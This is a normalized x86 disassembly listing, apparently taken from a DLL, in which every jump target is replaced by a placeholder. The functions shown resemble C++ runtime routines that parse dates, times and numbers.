mov ecx esi
call sub_10005d9c
mov cl 0x30
sub cl [ ebp - 0x2c ]
add al cl
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x3c ] eax
je r-xdata
inc ebx
mov ecx esi
mov bl 0x1
call sub_10005eb7
inc edi
or ebx 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
sub_1004164e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_100070de
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x4 ]
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005eb7
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005eb7
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10041712
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_100070de
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_100070de
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_100070de
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_100070de
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_100070de
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10005d9c
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005eb7
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005eb7
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x18 ]
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10041452
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005eb7
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x10 ]
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005eb7
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005d9c
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10041452
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100414b4
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_10041b3f
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_100414b4
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_10041bad
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10006453
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10041bed
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10006453
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10041c2d
push 0x98
mov eax sub_1004836c
call sub_10023e33
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_10023f0b
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_10020186
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1004141f
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
sub_10041cd7
push 0x60
mov eax sub_100483b2
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007b59
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_1003f331
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10007b41
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007b59
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1003dd96
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10007b41
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_1003c91e
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1003c0be
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_1003c0d7
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1003bd13
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_1003c19b
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1003c182
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_1003c0d7
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1003bd13
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003c4ea
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1003bd13
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10041e75
push 0x38
mov eax sub_100483df
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1003f331
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007b41
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_1001bb94
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10041f44
push 0x38
mov eax sub_100483df
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1003f331
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007b41
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_1001bb94
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_1004200f
push 0x38
mov eax sub_10048beb
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003f331
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bd2f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_100420bd
push 0x38
mov eax sub_10048beb
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003f331
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_1004216b
push 0x3c
mov eax sub_10047c41
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003f331
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bdd4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10042222
push 0x3c
mov eax sub_10047c41
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003f331
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001be97
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_100422d9
push 0x50
mov eax sub_10047c6e
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_1003f681
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c09c
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_10042381
push 0x54
mov eax sub_1004840c
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
